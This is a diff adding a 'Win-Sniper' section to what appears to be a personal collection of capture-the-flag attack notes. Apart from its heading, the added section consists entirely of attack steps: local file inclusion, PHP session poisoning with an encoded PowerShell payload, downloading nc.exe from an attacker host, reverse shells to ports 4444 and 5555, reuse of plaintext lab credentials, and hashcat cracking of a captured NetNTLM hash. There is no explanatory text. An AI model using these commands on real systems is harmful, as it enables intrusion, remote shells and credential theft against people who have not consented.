@@ -84,6 +84,40 @@ Read GMSA Password
 ```
 
 
+# Win-Sniper
+```
+http://10.10.10.151/user/login.php
+http://10.10.10.151/user/login.php
+http://10.10.10.151/blog/?lang=blog-en.php
+http://10.10.10.151/blog/?lang=/windows/win.ini
+curl -X GET http://10.10.10.151/blog/?lang=/windows/win.ini
+register: sahrul / sahrul
+curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
+<?=`powershell whoami`?> / pass123
+curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
+echo "wget http://10.10.14.2/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
+<?=`powershell /enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgAvAG4AYwAuAGUAeABlACAALQBvACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUACgA=`?>
+curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
+echo "C:\Windows\TEMP\nc.exe -e cmd.exe 10.10.14.2 4444" | iconv -t UTF-16LE | base64
+<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQARQBNAFAACgBjAC4AZQB4AGUAIAAtAGUAIABjAG0AZAAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAgADQANAA0ADQACgA=`?>
+curl -X GET http://10.10.10.151/blog/?lang=/windows/temp/sess_5hvbj099bc64r0jnqfoatc9k4k
+more C:\inetpub\wwwroot\user\db.php
+$password = convertto-securestring -AsPlainText -Force -String
+"36mEAhz/B8xQ~2VM";
+$credential = new-object -typename System.Management.Automation.PSCredential -
+argumentlist "SNIPER\chris",$password;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget
+http://10.10.14.23/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
+cmd.exe 10.10.14.23 4444} -credential $credential;
+wget http://10.10.14.23/instructions.chm -o C:\Users\chris\instructions.chm
+hashcat -m 5600 --force hash.txt rockyou.txt
+$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
+$credential = new-object -typename System.Management.Automation.PSCredential -
+argumentlist "SNIPER\Administrator",$password;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e
+cmd.exe 10.10.14.23 5555} -credential $credential;
+```
 
 
 # Win-StreamIO
